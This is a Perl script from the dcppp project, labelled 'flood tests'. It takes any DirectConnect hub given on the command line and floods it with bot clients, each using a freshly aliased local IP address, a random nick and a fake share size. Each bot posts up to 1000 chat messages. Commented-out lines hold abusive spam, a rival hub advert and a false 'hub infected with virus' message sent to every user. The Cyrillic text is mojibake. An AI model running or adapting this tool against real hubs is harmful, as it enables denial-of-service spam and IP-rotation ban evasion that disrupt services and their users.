#!/usr/bin/perl
my $Id = '$Id: dcppp.pl 107 2006-03-01 21:45:44Z pro $';

=copyright
flood tests
Copyright (C) 2005-2006 Oleg Alexeenkov http://sourceforge.net/projects/dcppp proler@gmail.com icq#89088275

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA,
or download it from http://www.gnu.org/licenses/gpl.html
=cut

use strict;
eval { use Time::HiRes qw(time sleep); };
use lib './lib';
use dcppp::clihub;

sub fisher_yates_shuffle {
  my $deck = shift;    # $deck is a reference to an array
  my $i    = @$deck;
  while ( $i-- ) {
    my $j = int rand( $i + 1 );
    @$deck[ $i, $j ] = @$deck[ $j, $i ];
  }
  return $deck;
}
print("usage: flood.pl [dchub://]host[:port] [bot_nick]\n"), exit if !$ARGV[0];
$ARGV[0] =~ m|^(?:dchub\://)?(.+?)(?:\:(\d+))?$|;
for my $ipc ( map { @$_ } fisher_yates_shuffle( [ 230 .. 250 ] ) ) {
  for my $ipd ( map { @$_ } fisher_yates_shuffle( [ 1 .. 254 ] ) ) {
    print "if create 10.131.$ipc.$ipd\n";
    print `ifconfig lo1 alias 10.131.$ipc.$ipd/32`;
    print "ok\n";
    my $dc = dcppp::clihub->new(
      'host' => $1,
      ( $2 ? ( 'port' => $2 ) : () ),
      'Nick' => ( $ARGV[1] or 'z' . int( rand(100000000) ) ) . 'x',
      #   'Nick'		=>	'xxxx',
      'sharesize' => int( rand 100000000000 ) + int( rand 100000000000 ) * int( rand 100 ),
      #   'log'		=>	sub {},	# no logging
      #    'log'		=>	sub {return if $_[0] =~ /dbg|dmp/},	# no logging
      #   'min_chat_delay'	=> 0.401,
      #   'min_cmd_delay'	=> 0.401,
      'client'      => '++',
      'V'           => '0.697',
      'description' => '',
      'M'           => 'P',
      'sockopts'    => { 'LocalAddr' => "10.131.$ipc.$ipd" },
    );
next if !$dc->{'socket'};
#      $dc->cmd( 'chatline', 'ƒоброго времени суток! ѕользу€сь случаем, хотим сказать вам: ¬џ Ё@3Ѕ@Ћ» —ѕјћ»“№!' );
     for (1..15) {    #sleep(5); $dc->recv();
next if !$dc->{'socket'} or $dc->{'status'} eq 'connected';
    $dc->recv();
    sleep(1);
}
   for (1..1000) {
last if !$dc->{'socket'} or $dc->{'status'} ne 'connected';
    print("BOT SEND all\n"),
#      $dc->cmd( 'chatline', 'Ќа–оƒ, ѕр»гЋаЎа≈м ¬а— Ќа ѕр»кќл№нџй хјб 10. 139. 24 .136  !!! ¬аћ ¬с≈гƒа –аƒ HUB -=NEW-CITY=-, Ќе «аЅуƒь“е ƒоЅа¬и“ь в »зЅрјннќе!!' );
#      $dc->cmd( 'chatline', 'ƒоброго времени суток! ѕользу€сь случаем, хотим сказать вам: ¬џ Ё@3Ѕ@Ћ» —ѕјћ»“№!'. $_);
      $dc->cmd( 'chatline', 'ƒоброго времени суток! ѕользу€сь случаем, хотим попросить ¬ас больше никогда не рекламировать свой хаб где попало. —пасибо. '.$_ );
#    sleep(1);
}
#    print("BOT SEND to $_\n"), $dc->cmd( 'To', $_, 'HUB за ражен виру сом сро чно поки ньте его!' )
#      for keys %{ $dc->{'NickList'} };
    $dc->recv();    #sleep(5); $dc->recv();
    $dc->destroy();
    sleep(2);
    print "if del 10.131.$ipc.$ipd\n";
    print `ifconfig lo1  10.131.$ipc.$ipd/32 -alias`;
    print "ok\n";
  }
}
